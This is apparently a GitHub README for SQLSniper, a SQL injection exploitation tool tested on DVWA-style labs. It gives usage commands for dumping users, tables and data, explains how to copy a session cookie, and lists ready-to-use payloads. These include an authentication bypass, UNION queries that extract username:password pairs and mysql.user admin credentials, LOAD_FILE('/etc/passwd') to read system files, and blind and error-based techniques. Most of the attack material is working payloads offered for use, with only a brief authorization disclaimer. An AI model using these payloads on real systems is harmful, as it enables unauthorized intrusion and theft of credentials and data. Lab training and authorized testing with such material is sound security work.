# SQLSniper (to be used after [Injectionary](https://github.com/koreyhacks/Injectionary) attack)

SQLSniper is an advanced SQL injection tool designed for precision targeting and exploitation of SQL injection vulnerabilities. With a focus on ethical hacking and penetration testing, SQLSniper provides security professionals with a powerful arsenal for identifying and extracting data from vulnerable applications.

![2025-03-11 22_50_04-KALI  Running  - Oracle VirtualBox _ 1](https://github.com/user-attachments/assets/01be98bf-052d-40af-942b-26c48ed2cc31)


## Features

- Multiple attack modes for comprehensive vulnerability assessment
- Database structure reconnaissance (tables, columns, versions)
- User credential extraction
- Interactive mode for custom SQL queries
- Colorful, intuitive interface with real-time feedback
- Easy-to-use command-line interface

## Installation

```bash
# Clone the repository
git clone https://github.com/koreyhacks/sqlsniper.git
cd sqlsniper

# Install dependencies
pip install requests beautifulsoup4 colorama
```

## Usage

Basic usage:

```bash
python3 sqlsniper.py -u "http://target-url/vulnerable-page/" -c "PHPSESSID=your_session_id;security=low" -m users
```

### Command-line Options

| Option | Long Form | Description | Required |
|--------|-----------|-------------|----------|
| `-u` | `--url` | Base URL of vulnerable SQL injection page | Yes |
| `-c` | `--cookie` | Session cookie (format: PHPSESSID=value;security=low) | Yes |
| `-m` | `--mode` | Attack mode (users, version, tables, columns, data, interactive) | No (default: users) |
| `-t` | `--table` | Target table name for column or data modes | For columns and data modes |
| `-cols` | `--columns` | Comma-separated list of columns for data mode | For data mode |

### Attack Modes

SQLSniper offers several specialized attack modes:

- **users**: Extract user credentials from the database
- **version**: Identify database type and version
- **tables**: Enumerate database tables
- **columns**: List columns in a specific table
- **data**: Extract data from specified table columns
- **interactive**: Enter custom SQL injection queries manually

## Examples (your PHPSESSID will be different)

### Dumping All Users

```bash
python3 sqlsniper.py -u "http://localhost/vulnerabilities/sqli/" -c "PHPSESSID=0v7plsq76ts6hr8dmnqiq427s4;security=low" -m users
```

### Identifying Database Version

```bash
python3 sqlsniper.py -u "http://localhost/vulnerabilities/sqli/" -c "PHPSESSID=0v7plsq76ts6hr8dmnqiq427s4;security=low" -m version
```

### Listing Database Tables

```bash
python3 sqlsniper.py -u "http://localhost/vulnerabilities/sqli/" -c "PHPSESSID=0v7plsq76ts6hr8dmnqiq427s4;security=low" -m tables
```

### Viewing Columns in a Table

```bash
python3 sqlsniper.py -u "http://localhost/vulnerabilities/sqli/" -c "PHPSESSID=0v7plsq76ts6hr8dmnqiq427s4;security=low" -m columns -t users
```

### Extracting Data from a Table

```bash
python3 sqlsniper.py -u "http://localhost/vulnerabilities/sqli/" -c "PHPSESSID=0v7plsq76ts6hr8dmnqiq427s4;security=low" -m data -t users -cols user_id,first_name,last_name,password
```

## Interactive Mode

The interactive mode is SQLSniper's most powerful feature, allowing you to craft and execute custom SQL injection payloads directly against the target. This mode is particularly useful for:
- Exploring database structures beyond the automated modes
- Testing various injection techniques
- Extracting specific data with custom queries
- Training and learning SQL injection techniques

### Launching Interactive Mode

```bash
python3 sqlsniper.py -u "http://localhost/vulnerabilities/sqli/" -c "PHPSESSID=0v7plsq76ts6hr8dmnqiq427s4;security=low" -m interactive
```

### Using Interactive Mode

Once launched, you'll see the SQLSniper prompt:
```
SQLSniper> 
```

At this prompt, you can enter SQL injection payloads. The tool automatically formats and sends these to the target.

### Common Payload Examples

Below are some useful payloads to try in interactive mode:

#### Basic Authentication Bypass
```
1' OR '1'='1
```
This basic payload attempts to bypass login forms by making the WHERE clause always evaluate to true.

#### Database Version Detection
For MySQL/MariaDB:
```
0' UNION SELECT 1,@@version,3 -- -
```

For PostgreSQL:
```
0' UNION SELECT 1,version(),3 -- -
```

For Microsoft SQL Server:
```
0' UNION SELECT 1,@@version,3 -- -
```

#### List All Tables
```
0' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() -- -
```
This reveals all tables in the current database.

#### List Columns in a Table
```
0' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' -- -
```
Replace 'users' with your target table name.

#### Extract Data from Table
```
0' UNION SELECT 1,CONCAT(username,':',password),3 FROM users -- -
```
This extracts username and password pairs from a users table.

#### Multiple Column Data
```
0' UNION SELECT 1,CONCAT(user_id,':',username,':',password,':',email),3 FROM users -- -
```
Extract multiple columns separated by colons.

#### Database Administrator Accounts
```
0' UNION SELECT 1,CONCAT(user,':',password),3 FROM mysql.user -- -
```
On MySQL, attempt to get database admin credentials.

#### File System Access (MySQL)
```
0' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 -- -
```
Attempts to read system files (requires appropriate permissions).

### Tips for Crafting Payloads

1. **Match Column Count**: When using UNION attacks, ensure the number of columns matches the original query. If you get errors, try different numbers (e.g., `1,2,3` or `1,2,3,4`).

2. **Data Type Matching**: When using UNION, the data types must match the original query. Use NULL for columns you don't need:
   ```
   0' UNION SELECT NULL,username,NULL FROM users -- -
   ```

3. **Comment Techniques**: Different databases use different comment styles:
   - MySQL/PostgreSQL: `-- -` or `#`
   - SQL Server: `--`
   - Oracle: `--`

4. **String Concatenation**: Different databases have different concatenation operators:
   - MySQL: `CONCAT(col1, col2)`
   - SQL Server: `col1 + col2`
   - Oracle: `col1 || col2`
   - PostgreSQL: `col1 || col2`

5. **Escaping Problems**: If quotes or other characters cause issues, try using hex encoding:
   ```
   0' UNION SELECT 1,0x48656C6C6F20576F726C64,3 -- -
   ```
   (This injects "Hello World" in hex)

### Exiting Interactive Mode

To exit interactive mode, simply type:
```
exit
```

## Finding Your Session Cookie

1. Log in to the target website in your browser
2. Open Developer Tools (F12 or right-click > Inspect)
3. Navigate to the Application/Storage tab
4. Look for Cookies in the sidebar
5. Copy the value of the PHPSESSID cookie

## Database-Specific SQL Injection Techniques

### MySQL/MariaDB

- **Comment Syntax**: `-- -` or `#`
- **String Concatenation**: `CONCAT(str1, str2)`
- **Substring**: `SUBSTRING(string, start, length)`
- **Database Version**: `@@version` or `VERSION()`
- **Current Database**: `DATABASE()`
- **List Tables**: `SELECT table_name FROM information_schema.tables`
- **List Columns**: `SELECT column_name FROM information_schema.columns WHERE table_name='target'`

### Microsoft SQL Server

- **Comment Syntax**: `--`
- **String Concatenation**: `str1 + str2`
- **Substring**: `SUBSTRING(string, start, length)`
- **Database Version**: `@@version`
- **Current Database**: `DB_NAME()`
- **List Tables**: `SELECT name FROM sysobjects WHERE xtype='U'`
- **List Columns**: `SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'target')`

### Oracle

- **Comment Syntax**: `--`
- **String Concatenation**: `str1 || str2`
- **Substring**: `SUBSTR(string, start, length)`
- **Database Version**: `SELECT banner FROM v$version`
- **Current Database**: `SELECT SYS_CONTEXT('USERENV', 'DB_NAME') FROM dual`
- **List Tables**: `SELECT table_name FROM all_tables`
- **List Columns**: `SELECT column_name FROM all_tab_columns WHERE table_name = 'TARGET'`

## Screenshots

### User Extraction
![2025-03-11 22_53_13-KALI  Running  - Oracle VirtualBox _ 1](https://github.com/user-attachments/assets/a588a892-987a-4a04-b368-af12015fea84)

### Interactive Mode
![2025-03-11 22_58_45-KALI  Running  - Oracle VirtualBox _ 1](https://github.com/user-attachments/assets/58779216-91a8-40e8-b910-469817144d2b)


## Troubleshooting

### Common Issues

1. **No Results Returned**
   - Verify your PHPSESSID is current and valid
   - Ensure the security level is set correctly (typically "low" for DVWA)
   - Try a simpler payload to confirm the injection point is vulnerable

2. **Syntax Errors**
   - Different databases require different syntax - try database-specific payloads
   - Check for proper quote escaping
   - Ensure comment termination is appropriate for the target database

3. **Column Count Mismatch**
   - If using UNION attacks, try different numbers of columns until you find the match
   - Example progression: `' UNION SELECT 1 -- -`, then `' UNION SELECT 1,2 -- -`, etc.

### Advanced Techniques

1. **Blind SQL Injection**: When no output is visible, use time-based techniques:
   ```
   1' AND (SELECT SLEEP(5)) -- -
   ```

2. **Error-Based Extraction**: Use database errors to extract data:
   ```
   1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- -
   ```

## Tested Environments

SQLSniper has been successfully tested against:
- DVWA (Damn Vulnerable Web Application)
- bWAPP
- OWASP Juice Shop
- WebGoat

## Disclaimer

SQLSniper is designed for ethical hacking and security testing purposes only. Always ensure you have proper authorization before testing any system or application. The author is not responsible for any misuse or damage caused by this tool.


## Author

Created by [koreyhacks_](https://github.com/koreyhacks)

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.
